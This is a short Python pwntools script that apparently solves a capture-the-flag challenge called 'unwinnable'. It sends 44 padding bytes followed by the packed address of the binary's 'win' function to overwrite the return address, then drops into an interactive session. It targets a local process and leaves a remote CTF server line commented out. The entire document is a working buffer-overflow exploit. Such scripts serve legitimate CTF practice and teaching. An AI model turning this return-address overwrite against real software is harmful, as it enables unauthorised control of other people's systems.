from pwn import *

elf = ELF("./source/unwinnable")

r = process("./source/unwinnable")
#r = remote("unwinnable.heltsikker.no", 9011)

win = p32(elf.symbols["win"])
padding = b"A"*44

log.success("Winning!")

r.sendline(padding+win)
r.recv()
r.interactive()

